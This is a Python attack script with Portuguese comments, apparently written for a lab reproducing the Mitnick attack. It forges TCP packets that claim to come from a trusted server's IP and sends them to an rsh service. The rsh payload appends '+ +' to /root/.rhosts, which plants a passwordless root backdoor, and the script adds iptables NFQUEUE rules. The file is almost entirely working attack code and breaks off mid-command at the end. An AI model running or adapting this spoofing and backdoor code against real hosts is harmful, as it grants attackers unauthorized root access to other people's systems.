from scapy.all import *
from netfilterqueue import NetfilterQueue
import subprocess
from time import sleep

# Configurações de rede
attacker_ip = "10.9.0.1"
xterminal_ip = "10.9.0.5"
trusted_server_ip = "10.9.0.6"

# Porta de origem e destino
src_port = 1023
dst_port = 514

def get_network_interface():
    command = f"arp | grep {xterminal_ip} | awk '{{print $5}}'"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def send_syn(seq):
    ip_layer = IP(src=trusted_server_ip, dst=xterminal_ip)
    tcp_layer = TCP(sport=src_port, dport=dst_port, flags="S", seq=seq)
    packet = ip_layer / tcp_layer
    return sr1(packet)

def send_ack(seq, ack):
    ip_layer = IP(src=trusted_server_ip, dst=xterminal_ip)
    tcp_layer = TCP(sport=src_port, dport=dst_port, flags="A", seq=seq, ack=ack)
    packet = ip_layer / tcp_layer
    send(packet)

def send_rsh(seq, ack):
    ip_layer = IP(src=trusted_server_ip, dst=xterminal_ip)
    tcp_layer = TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq, ack=ack)
    rsh_command = b"\x00root\x00root\x00echo + + >> /root/.rhosts \x00"
    packet = ip_layer / tcp_layer / rsh_command
    return sr1(packet)

def packet_callback(packet):
    captured_packet = IP(packet.get_payload())
    if captured_packet.haslayer(TCP) and captured_packet[TCP].dport == 514:
        print("Captured and processed packet:")
        captured_packet.show()
    packet.accept()

interface = get_network_interface()
os.system(f'iptables -I FORWARD -i {interface} -p tcp --dport 514 -j NFQUEUE --queue-num 1')

nfqueue = NetfilterQueue()
nfqueue.bind(1, packet_callback)

seq = 123
response = send_syn(seq)

sleep(0.5)

ack = response.seq + 1
seq += 1
send_ack(seq, ack)

response = send_rsh(seq, ack)

os.system(f'iptables -D FORWARD -i {interface} -p tcp
